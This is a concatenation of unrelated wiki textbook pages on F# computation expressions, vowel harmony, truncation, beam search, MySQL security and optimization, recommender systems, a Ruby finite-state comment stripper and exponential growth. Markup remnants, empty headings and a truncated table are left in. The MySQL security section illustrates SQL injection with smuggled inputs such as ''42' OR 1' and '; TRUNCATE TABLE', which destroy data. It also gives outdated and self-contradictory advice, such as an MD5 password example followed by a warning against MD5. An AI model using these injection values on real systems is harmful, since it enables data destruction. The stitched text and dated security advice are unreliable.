Monads are powerful, but beyond two or three variables, the number of nested functions becomes cumbersome to work with. F# provides syntactic sugar which allows us to write the same code in a more readable fashion. Workflows are evaluated using the form &lt;code&gt;builder { comp-expr }&lt;/code&gt;. For example, the following pieces of code are equivalent:

{| class=&quot;wikitable&quot;
! width=&quot;50%&quot; | Sugared syntax
! width=&quot;50%&quot; | De-sugared syntax
|-
| valign=&quot;top&quot; |
&lt;source lang=&quot;ocaml&quot;&gt;
let maybe = new MaybeBuilder()
let sugared =
    maybe {
        let x = 12
        let! y = Some 11
        let! z = Some 30
        return x + y + z
    }&lt;/source&gt;
| valign=&quot;top&quot; |
&lt;source lang=&quot;ocaml&quot;&gt;
let maybe = new MaybeBuilder()
let desugared = 
    maybe.Delay(fun () -&gt;
        let x = 12
         maybe.Bind(Some 11, fun y -&gt;
            maybe.Bind(Some 30, fun z -&gt;
                maybe.Return(x + y + z)
                )
            )
        )&lt;/source&gt;
|}

: '''Note:''' You probably noticed that the sugared syntax is strikingly similar to the syntax used to declare [[F_Sharp_Programming/Sequences|sequence expressions]], &lt;code&gt;seq { expr }&lt;/code&gt;. This is not a coincidence. In the F# library, sequences are defined as computation expressions and used as such. The [[F_Sharp_Programming/Async_Workflows|async workflow]] is another computation expression you'll encounter while learning F#.

The sugared form reads like normal F#. The code &lt;code&gt;let x = 12&lt;/code&gt; behaves as expected, but what is &lt;code&gt;let!&lt;/code&gt; doing? Notice that we say &lt;code&gt;let! y = Some 11&lt;/code&gt;, but the value &lt;code&gt;y&lt;/code&gt; has the type &lt;code&gt;int&lt;/code&gt; rather than &lt;code&gt;int option&lt;/code&gt;. The construct &lt;code&gt;let! y = ''...''&lt;/code&gt; invokes a function called &lt;code&gt;maybe.Bind(x, f)&lt;/code&gt;, where the value &lt;code&gt;y&lt;/code&gt; is bound to parameter passed into the &lt;code&gt;f&lt;/code&gt; function.

Similarly, &lt;code&gt;return '''...'''&lt;/code&gt; invokes a function called &lt;code&gt;maybe.Return(x)&lt;/code&gt;. Several new keywords de-sugar to some other construct, including ones you've already seen in sequence expressions like &lt;code&gt;yield&lt;/code&gt; and &lt;code&gt;yield!&lt;/code&gt;, as well as new ones like &lt;code&gt;use&lt;/code&gt; and &lt;code&gt;use!&lt;/code&gt;.

This fsi sample shows how easy it is to use our maybe monad with computation expression syntax:

&lt;source lang=&quot;ocaml&quot;&gt;&gt; type MaybeBuilder() =
    member this.Bind(x, f) =
        printfn &quot;this.Bind: %A&quot; x
        match x with
        | Some(x) when x &gt;= 0 &amp;&amp; x &lt;= 100 -&gt; f(x)
        | _ -&gt; None
    member this.Delay(f) = f()
    member this.Return(x) = Some x

let maybe = MaybeBuilder();;

type MaybeBuilder =
  class
    new : unit -&gt; MaybeBuilder
    member Bind : x:int option * f:(int -&gt; 'a0 option) -&gt; 'a0 option
    member Delay : f:(unit -&gt; 'a0) -&gt; 'a0
    member Return : x:'a0 -&gt; 'a0 option
  end
val maybe : MaybeBuilder

&gt; maybe {
    let x = 12
    let! y = Some 11
    let! z = Some 30
    return x + y + z
};;
this.Bind: Some 11
this.Bind: Some 30
val it : int option = Some 53

&gt; maybe {
    let x = 12
    let! y = Some -50
    let! z = Some 30
    return x + y + z
};;
this.Bind: Some -50
val it : int option = None&lt;/source&gt;

This code does the same thing as the desugared code, only its much much easier to read.

=== Dissecting Syntax Sugar ===

According the [http://research.microsoft.com/en-us/um/cambridge/projects/fsharp/manual/spec2.aspx#_Toc207785614 F# spec], workflows may be defined with the following members:

{| class=&quot;wikitable&quot;

== What are Computation Expressions Used For? ==

F# encourages of a programming style called ''language oriented programming'' to solve problems. In contrast to general purpose programming style, language oriented programming centers around the programmers identifying problems they want to solve, then writing domain specific mini-languages to tackle the problem, and finally solve problem in the new mini-language.

Computation expressions are one of several tools F# programmers have at their disposal for designing mini-languages. Its surprising how often computation expressions and monad-like constructs occur in practice. For example, the [http://spbhug.folding-maps.org/wiki/MonadsEn Haskell User Group] has a collection of common and uncommon monads, including those which compute distributions of integers and parse text. Another significant example, an F# implementation of software transactional memory, is introduced on [http://hubfs.fpish.net/topic/None/57220 hubFS].

== Gemination ==

== Diphthongs ==

== Suprasegmentals ==

== Morphomes ==

== Vowel Harmony ==

This feature is common in agglutinative languages, i.e. in languages where one suffix represents one property (Turkic, Mongolian, Finnish, Hungarian). All vowels are divided in two groups (back vowels and front vowels), and only vowels from one group can be used in the word; therefore all suffices have two forms.

For example, in Tatar language the groups are following:
 First group (Back vowels):   a, ı, í, o, u
 Second group (Front vowels): ä, e, i, ö, ü
Plural suffix has forms '''lar''' and '''lär'''. The word for ''friend'' is '''dus''', so ''friends'' is '''duslar'''; the word for ''house'' is '''öy''', therefore, ''houses'' is '''öylär'''.

Sometimes there are neutral vowels that belong to both groups, like '''i''' and '''e''' in Finnish:
 First group (Back vowels):   a, o, u, e, i
 Second group (Front vowels): ä, ö, y, e, i

Usually group is selected by the kind of vowels in the root of the word. But in Chukchi language, for example, there are dominant and recessive group, and all vowels from recessive group are replaced with their dominant counterparts when a suffix with a dominant vowel is used.

      <text xml:space="preserve">Truncating is a simpler alternative to rounding. Digits to the right of the place required are just dropped — disregarding whether the first digit to the right is higher than 5 in rank or not.

== Examples ==
What is 98.57 truncated to the tenths place?

The 7 in the hundredths place is dropped. The answer is 98.5.


Truncate 33.504 to the units place.

All digits to the right of the units place (3) are dropped. the answer is 33.

      <text xml:space="preserve">== Definition ==

Beam search is a restricted, or modified, version of either a [[Artificial Intelligence/Search/Exhaustive search/Breadth-first search|breadth-first search]] or a [[Artificial Intelligence/Search/Heuristic search/Best-first search|best-first search]].  It is restricted in the sense that the amount of memory available for storing the set of alternative search nodes is limited, and in the sense that non-promising nodes can be pruned at any step in the search (Zhang, 1999).  The pruning of non-promising nodes is determined by problem-specific heuristics (Zhang, 1999).  The set of most promising, or best alternative, search nodes is called the “beam” (Xu and Fern, 2007).  Essentially, beam search is a forward-pruning, heuristic search.

== Search Components and Algorithm ==

A beam search takes three components as its input: a problem to be solved, a set of heuristic rules for pruning, and a memory with a limited available capacity (Zhang, 1999).  The problem is the problem to be solved, usually represented as a graph, and contains a set of nodes in which one or more of the nodes represents a goal.  The set of heuristic rules are rules specific to the problem domain and prune unfavourable nodes from the memory in respect to the problem domain.  The memory is where the “beam” is stored, where when memory is full and a node is to be added to the beam, the most costly node will be deleted, such that the memory limit is not exceeded.

The following algorithm for a beam search, as a modified best-first search, is adapted from Zhang’s 1999:

&lt;code&gt;	
 beamSearch(problemSet, ruleSet, memorySize)
     openMemory = new memory of size memorySize
     nodeList = problemSet.listOfNodes
     node = root or initial search node
     Add node to openMemory;
     while (node is not a goal node)
          Delete node from openMemory;
          Expand node and obtain its children, evaluate those children;
          If a child node is pruned according to a rule in ruleSet, delete it;
          Place remaining, non-pruned children into openMemory;
          If memory is full and has no room for new nodes, remove the worst
              node, determined by ruleSet, in openMemory;
          node = the least costly node in openMemory;
&lt;/code&gt;

== Advantages, Disadvantages, and Practical Applications ==

Beam search has the advantage of potentially reducing the computation, and hence the time, of a search (Xu and Fern, 2007).  As well, the memory consumption of the search is far less than its underlying search methods (Furcy and Koenig).  This potential advantage rests upon the accuracy and effectiveness of the heuristic rules used for pruning, and having such rules can be somewhat difficult due to the expert knowledge required of the problem domain (Zhang, 1999).
The main disadvantages of a beam search are that the search may not result in an optimal goal and may not even reach a goal at all.  In fact, the beam search algorithm terminates for two cases: a required goal node is reached, or a goal node is not reached and there are no nodes left to be explored (Zhang, 1999).  Beam search has the potential to be incomplete.
Despite these disadvantages, beam search has found success in the practical areas of speech recognition, vision, planning, and machine learning (Zhang, 1999).

      <text xml:space="preserve">== Security ==

Please, remember that the internet has been created by persons who don't want us to have any sort of secrets. Also remember that a lot of people are payd to learn our secrets and register them somewhere.

Paranoia is a from of intelligence.

=== Connection parameters ===

Sometimes, connection parameters (including username and password) are stored in a plain text file, for example a .ini file. This is insecure: if a user guesses how it is called, he can read it. If it's located outside the web server's WWW directory it's more secure, but it's a better practice to store it as a constant in a program file.

It's always possible that a user manages to get your FTP password or other passwords. So the username and the password you use to connect to MySQL should be different from other usernames / passwords.

MySQL passwords must be secure. You don't need to remember them. They should contain lowercase letters, uppercase letters, numbers and symbols (like '_'); they should not contain existing words or your birth date; they should never be sent via email (if they are, there must be some way to modify them); they should not be stored where it is not absolutely necessary to store them.

=== SQL Injections ===

==== What are SQL Injections? ====

In a perfect world, you would know that values contained in $_POST are values that you can insert into a SQL statement. But in a perfect world there are no poverty or proprietary softwares, so this is not the case. Those values may contain attacks called &quot;SQL Injections&quot;. When you expect values like &quot;'42'&quot;, you may find values like &quot;'42' OR 1&quot;. So, when you try to make a statements like this:

 DELETE FROM `articles` WHERE `id`=42

you may create statements like this instead:

 DELETE FROM `articles` WHERE `id`=42 OR 1

which DELETEs all records.

Also in some cases, you try to make a query like this:

 SELECT * FROM `my_nice_table` WHERE title='bla bla'

And a user may turn it to something like this:

 SELECT * FROM `my_nice_table` WHERE title='bla bla'; TRUNCATE TABLE `my_nice_table`

These are just examples. 
It's easy to realize if all records are disappeared from your tables. 
If the tables are properly backed up, you can repopulate them. 
But there are worst cases. 
If a user learns how to manipulate your database, he can create an administration account for himself, or he can make modifications to your site's contents that you'll never see, or he can even register payments he has not made.

==== How to prevent that ====

Simply, inputs that must represent a value, should not be accepted if they contain something more.

* String values
They are enclosed by 'quotes'. 
Every quote present in them should be converted into &lt;nowiki&gt;''&lt;/nowiki&gt; or &lt;nowiki&gt;\'&lt;/nowiki&gt;. 
PHP recommends using &lt;code&gt;mysql_real_escape_string&lt;/code&gt; to substitute these special characters.

* Numbers (integer, float)
They must be numeric input. 
If they contain something like OR or spaces, they are not numeric.

* Dates
Enclose them within 'quotes' and manage them as if they were strings.

* NULL / UNKNOWN / TRUE /FALSE
These values should never be entered by the user, but should created programmatically.

* SQL names
In some cases, SQL names could be contained in user input. 
A common case are column names to be used in the ORDER BY clause, which may come from $_GET. 
Enclose them within `backquotes` and replace every occurrences of ` with ``. 
Of course, generally speaking, this is a very bad practice if the SQL names are not used ONLY in the ORDER BY clause.

* Comments
User input should never be inserted in SQL comments.

=== Passwords ===

When passwords are stored in a database, they are usually encrypted. 
The encryption should be done by the script and not by MySQL. 
If it is done via SQL, the passwords are written by the statements as plain text. 
This means that they are visible through:

* possibly, some system logs, if the communications with the db are done through a network and is not encrypted
* MySQL logs
* SHOW PROCESSLIST

So, one should never send a query like this:

 SELECT 1 FROM `users` WHERE `password`=MD5('abraxas')

But, in PHP, you should write:

 $sql = &quot;SELECT 1 FROM `users` WHERE `password`=MD5('&quot;.md5('abraxas').&quot;')&quot;;

You should never use insecure encryption functions like PASSWORD(). 
Also, you should not use 2-way encryption. 
Only cryptographic hashs, such as SHA256 are secure, and don't use older hash algorithms like MD5.

Passwords, even if they are safely encrypted, should never be retrieved by a SELECT. 
It's insecure and 1-way encryption does not require that.

=== SSL ===

If all contents of your databases are public, there is no reason to use encryption for communications. 
But generally, this is not the case.  
Even so, there may be a restricted set of people authorized to submit new content to the site, 
and this will require the use of passwords.

So often it's a good idea to use SSL encryption. 
See your driver's documentation to see how to do this (it's always a simple connection option).

Not only will SSL encrypt the network traffic containing the users password, 
but it can also validates to the user the site as being the correct one using a certificate. 
One possible attack has a site created to look like the victim site, attempting to get you to submit your username and password.

== Optimization ==

=== API Calls ===

==== Persistent connections ====

By using persistent connections, we keep the connection with the server open, so that several queries can be executed without the overhead of closing and reopening a connection each time a script is run.

Note that this is not always a good optimization. Try to imagine how many persistent connections a server's RAM should store with a shared hosting setup, if every hosted sites use only persistent connections: there will be too many at once.

Persistent connections are available through many languages.

==== Free memory ====

When you execute a query, you get a recordset and put it into a variable. 
To keep it in memory when you don't need it anymore is a waste of ram. 
That's why, generally, you should free the memory as soon as possible. 
If it is possible only few lines before the end of the script, this makes no sense. 
But in some cases, it is good.

==== Fetch rows ====

Many APIs support two ways for fetching the rows: you can put them into a normal array, into an object, or into an associative array. 
Putting the rows into an object is the slowest way, while putting them into a normal array is the fastest. 
If you are retrieving a single value per row, putting it into an array may be a good idea.

==== API vs SQL ====

Usually, the APIs support some methods which create an SQL statement and send it to the MySQL server. 
You may obtain the same effects by creating the statement by hand, but it's a slowest way. 
APIs' methods are generally more optimized.

=== Reduce client/server communications ===

* Some scripts use two queries to extract a Pivot table. 
Client/server communications are often a bottleneck, so you should try to use only one JOIN instead.

* If you need to use more than one query, you should use only one connection, if possible.

* Only retrieve the fields you really need.

* Try to not include in the SQL command too many meaningless characters (spaces, tabs, comments...).

==== CREATE ... SELECT, INSERT ... SELECT ====

When you create a new table from an existing table, you should using CREATE ... SELECT. 
When you want to populate an existing table from a query, 
you should use INSERT ... SELECT or a REPLACE ... SELECT. 
This way, you will tell the server to perform all the needed operations by sending only one SQL statement.

==== INSERT DELAYED ====

Many scripts don't check if the INSERTs are successful. 
If this is the case, you should use INSERT DELAYED instead. 
So, the client won't wait a confirm from the server before proceeding.

==== REPLACE ====

If you run a DELETE and then an INSERT, you need to communicate two SQL commands to the server. 
Maybe you may want to use REPLACE instead. 
Possibly, use REPLACE DELAYED.

=== Other Techniques ===

==== Storing data in cookies ====

Sometimes, session data are stored into a database. 
This requires at least one UPDATE and one SELECT every time a user loads a page. 
This can be avoided by storing session data into cookies.

Browsers allow users to not accept cookies, but if they don't accept them, they can't visit many important modern sites.

The only data that can't be securely stored into cookie are passwords. 
You may set a brief lifetime for cookies though, so the user's privacy is hardly compromised by your cookies. 
Or you can do the following:
* when a user successfully logs in your site, create a record with CURRENT_TIMESTAMP() and a random ID;
* set a cookie with the ID;
* when the user tries to do something, check if he's logged in:
 SELECT FROM `access` WHERE `id`=id_from_cookie AND `tstamp`&gt;=CURRENT_TIMESTAMP() - login_lifetime
* UPDATE the tstamp

==== Creating static contents ====

When a user browses an article or other dynamic contents (which means, contents stored into a database), a HTML document needs to be generated. 
Often, the page has not variable contents, but just contents which are INSERTed once, and rarely (or never) updated. 
An article or a list of links are a good example.

So, it may be a good idea creating a program which generates a static HTML page when an article is INSERTed into the database. 
The page may be deleted and re-generated if the article is UPDATEd. 
This saves a lot of SQL statements and work for the DBMS.

Of course this requires some privileges which you may not have. 
If you are using a hosting service, you may need to talk to technical support team about this.

== PHP ==

=== Drivers ===

PHP has the following official drivers for MySQL:

* mysql - Older, so it's still used by many web applications; it's a procedural PHP module
* mysqli - faster; can be used as a set of classes or as a normal procedural library
* PDO (PHP Data Objects) - uses PDO,  an abstraction layer for interaction with databases which has drivers for MySQL and ODBC.
* PDO_MYSQL support some advanced MySQL features and emulates them if not present.

The functions in the above drivers the extensions recall the methods in the C API. 
They can use the MySQL Client Library or mysqlnd, a Native Driver for PHP.

Sometimes, enabling both mysql and mysqli may cause some problems; so, if you use only one of them, you should disable the other one.

Also, PHP has a ODBC extension which may be used with MySQL.

[[PHP Programming/PEAR|PEAR]] is an important set of PHP classes which supports MySQL.

=== register_globals and $_REQUEST ===

PHP has an environment variables called register_globals. Since PHP 4.2 it's set to false by default, and you shouldn't set it. 
In PHP 5.3 this variable is also deprecated and in PHP 6 has been removed.

However, if your version of PHP supports register_globals, you can verify if it's set to true by calling the function ini_get(). 
If it's true, thought, you can't modify it with ini_set(). There are two ways to set it off:

* editing php.ini
(impossible if you're using a hosting service)

* adding one line to .htaccess:
 php_flag register_globals off
(sometimes possible in hosting)

The reason is that if register_globals is true, a user can arbitrary add variables to your script by calling them like this:

 your_script.php?new_variable=new_value

You should never user the $_REQUEST superglobal array. It can be used to retrieve variables from:

* $_ENV
* $_GET
* $_POST
* $_COOKIE
* $_SERVER

This is the order followed by PHP (may be modified by the variables_order environment variable). 
This means that if your script set a server variable called &quot;userid&quot; and you try to read it via $_REQUEST, the user can prevent that by adding a variable to the query string.

Also, you should never blindly trust the validity of HTTP variables.

Hallo PaulJC,

nice that you are working at the wikibooks &quot;Noob to Pro&quot;. I've noticed the changes that you made at [[Blender 3D: Noob to Pro/Simple Vehicle: Body]]. Is it possible for you to upload the images at [http://commons.wikimedia.org/w/index.php?title=Special:Upload&amp;uploadformstyle=basic commons.wikimedia.org] and include them that way in the page? Else the images are not shown in the page itself. 

Do you need help with uploading the images? We have templates to fill out the various fields and to give proper credit where it is necessary. [[Blender 3D: Noob to Pro/Using proper copyright RE:Blender]]

With kind regards. 

PS: I didn't send you an E-Mail. I hope you're notified when your discussion page changes. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 05:32, 4 April 2009 (UTC)</text>

      <text xml:space="preserve">== Recommender Systems ==

Recommender Systems were created to assist in sorting through the vast amount of information that the internet can provide. These systems function by taking in some type of user information, such as preferred music artists etc. and provide recommendations for new items based on the user’s previous choices. As shown by Zaier, Godin, and Faucher (2008) &lt;ref name=&quot;zaier_et_al&quot;&gt;{{Cite book
| publisher = axmedis
| last = Zaier
| first = Zied
| coauthors = Robert Godin, Luc Faucher
| title = Evaluating Recommender Systems
| date = 2008
}}&lt;/ref&gt; recommender systems have been very commercially successful, specifically in e-commerce.



== Basic Functioning ==

As defined by Zhan et al. (2008) &lt;ref name=&quot;zhan_et_al&quot;&gt;{{Cite book
| publisher = IEEE 
| isbn = 9781424425129
| pages = 778-783
| last = Zhan
| first = Justin
| coauthors = I-Cheng Wang, Chia-Lung Hsieh, Tsan-Sheng Hsu, Churn-Jung Liau, Da-Wei Wang
| title = Towards efficient privacy-preserving collaborative recommender systems
| date = 2008
}}&lt;/ref&gt;, a recommender system has two basic entities; the user, which is the person, or agent using the system to give and receive recommendations, and the item is whatever entity that is being rated and searched by the user. The users form a community, which is usually the main source of information for the database, however other methods are used as well.



=== Collaborative Filtering ===

Collaborative filtering is a commonly used system, though because it does not deal with. Chun and Hong (2001) &lt;ref name=&quot;chun_et_al&quot;&gt;{{Cite book
| publisher = IEEE 
| isbn = 0780370902
| pages = 1766-1770
| last = Chun
| first = In-Gook
| coauthors = In-Sik Hong 
| title = The implementation of knowledge-based recommender system for electronic commerce using Java expert system library
| date = 2001
}}&lt;/ref&gt; explain that this method is based on the idea that human preferences are correlated, and one individual’s preferences can provide suggestion about another who is similar along some constraint. The system operates on numeric rating values of items as given by users. 

To determine relatedness between two users in a collaborative system, a Pearson Correlation is often used. This is a mathematical formula often used in statistics that can determine the correlation between two variables, as expressed as a rating of how correlated the variables are.


=== Content Based Filtering ===

Research by Hijikata, Iwahama, and Nishida (2006) &lt;ref name=&quot;hijikata_et_al&quot;&gt;{{Cite book
| publisher = IEEE
| isbn = 1595931082
| pages = 1050-1057
| last = Hijikata
| first = Yoshinori
| coauthors = Kazuhiro Iwahama, Shogo Nishida 
| title = Content-based music filtering system with editable user profile 
| date = 2006
}}&lt;/ref&gt; on content based filtering indicates that though it a common recommender system for text based information, with current advancements it is becoming a good option for music as well. They explain that most filter systems that deal with music data tend to create a content model of parameters from the music, which is then compared with a user’s profile also using the music parameters. The system then functions by comparing the content model to the user profile, using one of two methods. Hijikata et al. define the first method as a vector method, which attaches vectors to parameters of the profile which are then compared to the content model using distance. The second method for comparison involves weighting the feature parameters of a profile, and subsequently using them in a calculation to be compared to a threshold value. Hijikata et al. refined comparing user profiles to a content model, and reduced issues with using content based filtering with music data by introducing a learned decision tree in the user profile. Using the decision tree allows the important parameters to be filtered out, and is easily read and changed by the user, and also removes unimportant noise data. 


=== Knowledge Based Filtering ===

Chung and Hong also distinguished another type of model, which is considered to be knowledge based. Knowledge based recommenders ask users about what they are looking for, and searches through a database to find selections based on the user’s requirements, and often ask the user to provide information as to the relevance of the choices.  

Though these are the most common types of recommender systems, there are many other types and hybrids that are occasionally used.


=== Agent Based Recommendation ===

Possibly the most popular and often used recommender is the internet search engine. An agent is a data miner that takes information about individuals. Though the type of system used to generate site recommendations varies, Birukov, Blanzieri, and Giorgini (2005) &lt;ref name=&quot;birukov_et_al&quot;&gt;{{Cite book
| publisher = ACM
| isbn = 1595930930
| pages = 618-624
| last = Birukov
| first = Alexander
| coauthors = Enrico Blanziere, Paolo Giogini
| title = Implicit 
| date = 2005
}}&lt;/ref&gt; created an agent based recommender which like most uses an individual’s behaviour to provide better suggestions to users within the individual’s community (group sharing similar patterns), but also extracted implicit knowledge from individual users for the groups.

== Implementation ==

Each of the system types described above involve different methods of search and recommendation. The only true commonality between them is the fact that they have an input, some sort of information from the user, processing, in which relevant options are determined, and an output, usually a text recommendation that often refers to an item, website, song/artist, etc. that can be subsequently viewed or accessed by the user.

Below is an example of pseudocode written by Birukov ''et al.'' as an example of the most commonly seen and used system, agent based recommendation:


&lt;pre&gt;
global result
for all message in INBOX do
     if (message.type == 'query') then
          result := nil
       if (query.sender == user) then
            google-search(query.sender,query.keyword,result.links)
            inform(self, user, result.links)
end if

SICS.internal-search(query.sender,query.keyword,result.links)
SICS.external-search(query.sender,query.keyword,result.agents)

if (query.sender == user) then
    if (result.agents == nil) then
         add(DF,result.agents)
end if

for all agent in result.agents do
      request(self,agent,query.keyword)
end for

inform(self, user, result.links)
     else
        inform(self, query.sender, result.links)
        inform(self, query.sender, result.agents)
end if

else if (message.type == reply) then
        if (message.content == resource-link) then
           add(resource-link, result.links)
else if (message.content == agent-ID) then
         add(agent-ID, result.agents)
end if
end if
end if

else if (message.type == 'feedback') then
        add(feedback,observations)

end if
end if
end for 

&lt;/pre&gt;

      <text xml:space="preserve">== Searching with Finite State Automata ==

A common way of searching for a pattern in a string of symbols is by using [http://en.wikipedia.org/wiki/Finite_state_machine Finite State Automata], also known as '''finite state machines''' or '''FSM'''s. FSMs are abstract structures which can be implemented in a number of different ways, but all of them share some common properties. Each FSM has&lt;ref name=&quot;wagner_et_al&quot;&gt;{{Cite book
| publisher = CRC Press
| isbn = 0849380863
| pages = 369
| last = Wagner
| first = Ferdinand
| coauthors = Ruedi Schmuki, Thomas Wagner, Peter Wolstenholme
| title = Modeling Software with Finite State Machines
| date = 2006
}}&lt;/ref&gt;:

* a finite set of '''states'''
* a way of receiving '''inputs'''
* '''transitions''', which are paths from one state to another triggered by inputs 
* optional '''actions''', which come in a few different flavours depending on what kind of event triggers them:
** '''entry actions''' occur when entering a particular state
** '''exit actions''' occur when exiting a particular state
** '''input actions''' only occur when a particular class of input is received while the machine is in a particular state
** '''transition actions''' occur during specified transitions

=== Acceptors ===

When used for pattern matches within strings, an FSM is given each successive character of the string as its input. For simple substring matching, the FSM would have one state for each number of characters in the substring matched so far.

Finite state automata which simply accept or reject an input string with a yes/no response are called [http://en.wikipedia.org/wiki/Finite_state_acceptor acceptors] &lt;ref name=&quot;roche&quot;&gt;{{Cite book
| publisher = MIT Press
| isbn = 0262181827
| pages = 464
| last = Roche
| first = Emmanuel
| title = Finite-state language processing
| date = 1997
}}&lt;/ref&gt;. Here is a [http://en.wikipedia.org/wiki/State_diagram state diagram] of an acceptor that returns a &quot;yes&quot; response when a string contains the substring &quot;aba&quot;:

[[File:Finite-state-acceptor-aba.png]]

The machine starts in the &quot;empty&quot; state, representing an empty substring buffer. The &quot;other&quot; transitions represent inputs of any character besides &quot;a&quot; or &quot;b&quot;, so the only input that will get the machine out of the empty state is the first character of the substring to be matched, &quot;a&quot;. From then on, inputs are converted into transitions from state to state.

The double circle around &quot;aba&quot; indicates that it is an '''accept state''' of this FSM, meaning that the machine will give a &quot;yes&quot; result if it is in this state when it has no more inputs to process. All other states are non-accpting states and would result in a &quot;no&quot; result at the end of processing.

=== Transducers ===

An FSM with actions that provide output is instead called a [http://en.wikipedia.org/wiki/Finite_state_transducer finite state transducer]&lt;ref name=&quot;roche&quot;/&gt;. Here is an example of a transducer written in [http://www.ruby-lang.org Ruby] which strips C++/Java-style comments out of an input stream:

&lt;pre&gt;
#!/usr/bin/env ruby

# comment_stripper.rb
# 
# Requires Ruby 1.8.7
# 
# Strips C++/Java style comments from an input stream using a finite state
# transducer. Single-line comments begin with two forward slashes (&quot;//&quot;) and
# extend to the end of the line. Block comments begin with a slash followed by an
# asterisk (&quot;/*&quot;) and end with an asterisk followed by a slash (&quot;*/&quot;).
# 
# When run from the command line, performs the transformation on standard input.
# 
# Example:
# 
# cat hello_world.cpp | ruby comment_stripper.rb

class CommentStripper
  def initialize()
    @current_state = :code
  end
  
  def input(c)
    output = INPUT_ACTIONS[c][@current_state] || ''
    @current_state = TRANSITIONS[c][@current_state] || @current_state
    return output
  end
  
  TRANSITIONS = Hash.new do |hash,input|
    # triggered by any characters other than the ones explicitly defined below
    {
      :slash  =&gt; :code,
      :star   =&gt; :block
    }
  end.merge(
    # overrides the default transitions defined above
    &quot;/&quot; =&gt; {
      :code   =&gt; :slash,
      :slash  =&gt; :line,
      :star   =&gt; :code
    },
    &quot;*&quot; =&gt; {
      :slash  =&gt; :block,
      :block  =&gt; :star
    },
    &quot;\n&quot; =&gt; {
      :line   =&gt; :code,
      :slash  =&gt; :code,
      :star   =&gt; :block
    }
  )
  
  INPUT_ACTIONS = Hash.new do |hash,input|
    {
      :code   =&gt; input,
      :slash  =&gt; (&quot;/&quot; + input)
    }
  end.merge(
    &quot;/&quot; =&gt; {},
    &quot;*&quot; =&gt; {
      :code   =&gt; &quot;*&quot;
    },
    &quot;\n&quot; =&gt; {
      :code   =&gt; &quot;\n&quot;,
      :slash  =&gt; &quot;/\n&quot;,
      :line   =&gt; &quot;\n&quot;
    }
  )
end

if $0 == __FILE__
  cs = CommentStripper.new
  $stdin.each_char do |c|
    print cs.input(c)
  end
end
&lt;/pre&gt;

The transitions and input actions are both defined in nested hash tables keyed by input and state. The ''input'' method takes in a single character of the input string, performs any necessary transition to a new state, and returns the transduced character based on the original state. This diagram shows the transitions and states defined in this machine:

      <text xml:space="preserve">[[Image:Exp.png|right|thumb|200px|Graph of x = ae&lt;sup&gt;bt&lt;/sup&gt;, where b is positive.]]
Many things are governed by exponential relationships. The exponential relationships which we shall be dealing with are of the following form:

&lt;math&gt;x = ae^{bt}&lt;/math&gt;,

where t is time, x is a variable, and a and b are constants. e is just a number, albeit a very special number. It is an irrational constant, like &amp;pi;. e is 2.71828182845904523536 to 20 decimal places. However, it is far easier just to find the e (or exp) button on your calculator.

The inverse function of e&lt;sup&gt;t&lt;/sup&gt; is the natural logarithm, denoted ln t:

&lt;math&gt;\ln t = \log_e t&lt;/math&gt;

[[Image:Plot-exponential-decay.png|right|thumb|200px|Graph of x = e&lt;sup&gt;-bt&lt;/sup&gt;, showing several different values of b.]]
==Growth and Decay==
When b is positive, an exponential function increases rapidly. This represents the growth of certain variables very well. When b is negative, an exponential function decreases, flattening out as it approaches the t axis. This represents the decay of certain variables.

==Exponential Relationships in the Real World==
An exponential relationship occurs when the rate of change of a variable depends on the value of the variable itself. You should memorise this definition, as well as understand it. Let us consider some examples:

[[Image:Candida_albicans_PHIL_3192_lores.jpg|left|thumb|200px|A petri dish with bacteria growing on it.]]
===Population Growth===
Consider a Petri dish full of agar jelly (food for bacteria) with a few bacteria on it. These bacteria will reproduce, and so, as time goes by, the number of bacteria on the jelly will increase. However, each bacterium does not care about whether there are other bacteria around or not. It will continue making more bacteria at the same rate. Therefore, as the total number of bacteria increases, their rate of reproduction increases. This is an exponential relationship with a positive value of b.

Of course, this model is flawed since, in reality, the bacteria will eventually have eaten all the agar jelly, and so the relationship will stop being exponential.

===Emptying Tank===
If you fill a large tank with water, and make a hole in the bottom, at first, the water will flow out very fast. However, as the tank empties, the pressure of the water will decrease, and so the rate of flow will decrease. The rate of change of the amount of water in the tank depends on the amount of water in the tank. This is an exponential relationship with a negative value of b - it is an exponential decay.

===Cooling===
A hot object cools down faster than a warm object. So, as an object cools, the rate at which temperature 'flows' out of it into its surroundings will decrease. Newton expressed this as an exponential relationship (known as Newton's Law of Cooling):

&lt;math&gt;T_t = T_{env} + (T_0 - T_{env})e^{-rt}&lt;/math&gt;,

where T&lt;sub&gt;t&lt;/sub&gt; is the temperature at a time t, T&lt;sub&gt;0&lt;/sub&gt; is the temperature at t = 0, T&lt;sub&gt;env&lt;/sub&gt; is the temperature of the environment around the cooling object, and r is a positive constant. Note that a here is equal to (T&lt;sub&gt;0&lt;/sub&gt; - T&lt;sub&gt;env&lt;/sub&gt;) - but a is still a constant since T&lt;sub&gt;0&lt;/sub&gt; and T&lt;sub&gt;env&lt;/sub&gt; are both constants. The '-' sign in front of the r shows us that this is an exponential decay - the temperature of the object is tending towards the temperature of the environment. The reason we add T&lt;sub&gt;env&lt;/sub&gt; is merely a result of the fact that we do not want the temperature to decay to 0 (in whatever unit of temperature we happen to be using). Instead, we want it to decay towards the temperature of the environment.

==Mathematical Derivation==
We have already said that an exponential relationship occurs when the rate of change of a variable depends on the value of the variable itself. If we translate this into algebra, we get the following:

&lt;math&gt;\frac{dx}{dt}\ = ax&lt;/math&gt; , where a is a constant.

By separating the variables:

&lt;math&gt;dx = ax dt&lt;/math&gt;

&lt;math&gt;\frac{1}{x} dx = a dt&lt;/math&gt;

&lt;math&gt;\int\frac{1}{x} dx = \int a dt&lt;/math&gt;

&lt;math&gt;\ln x = at + c&lt;/math&gt; (where c is the constant of integration)

&lt;math&gt;x = e^{at + c} = e^{at} e^c&lt;/math&gt;

If we let b = e&lt;sup&gt;c&lt;/sup&gt; (b is a constant, since e&lt;sup&gt;c&lt;/sup&gt; is a constant):

&lt;math&gt;x = be^{at}&lt;/math&gt;

==Questions==

1. Simplify Newton's Law of Cooling for the case when I place a warm object in a large tank of water which is on the point of freezing. Measure temperature in &amp;deg;C.

2. What will the temperature of an object at 40 &amp;deg;C be after 30 seconds? (Take r=10&lt;sup&gt;-3&lt;/sup&gt; s&lt;sup&gt;-1&lt;/sup&gt;.)

